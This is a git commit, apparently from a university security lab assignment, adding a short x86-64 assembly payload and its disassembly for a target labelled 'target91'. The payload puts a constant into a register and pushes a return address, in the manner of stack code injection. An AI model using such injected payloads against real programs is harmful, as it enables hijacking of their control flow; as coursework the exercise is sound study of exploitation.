dc60c96206f178e5757a888b823b60d3fd5aa578
YixueWang <ywang20@wpi.edu>
2017-04-16 21:38:18 -0400

    finished attack

---
+++ target91/example.d
@@ -0,0 +1,10 @@
+
+example.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 3b 63 2b 7a 	mov    $0x7a2b633b,%rdi
+   7:	68 4d 19 40 00       	pushq  $0x40194d
+   c:	c3                   	retq   
---
+++ target91/example.s
@@ -0,0 +1,4 @@
+movq $0x7a2b633b, %rdi
+pushq $0x0040194d
+retq
+
